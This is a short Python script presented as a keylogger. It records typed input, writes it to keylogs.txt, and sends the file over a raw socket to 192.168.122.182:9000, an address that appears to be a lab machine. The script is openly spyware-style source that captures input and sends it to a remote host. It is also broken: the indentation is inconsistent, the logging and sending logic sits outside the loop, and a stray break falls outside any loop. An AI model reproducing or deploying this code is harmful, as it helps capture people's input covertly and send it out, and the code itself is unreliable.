import socket
import os
log = ""
while True:
    keys = input()
if keys != "\x1b" and keys != "q" and keys != "Q": 
	log += str(keys)
    print("Key: " + str(keys) + " - Log: "+ log)
else: 
    f = open("keylogs.txt", "w+")
    f.write(log)
    f.close()
	print("Keylogger Closed. Sending keylogs...")
	sender_socket = socket.socket()
	sender_socket.connect(("192.168.122.182", 9000))
	with open("keylogs.txt", "rb") as f:
		data = f.read(1024)
		sender_socket.sendall(data)
		f.close()
    print("Keylogs Sent.")
    break
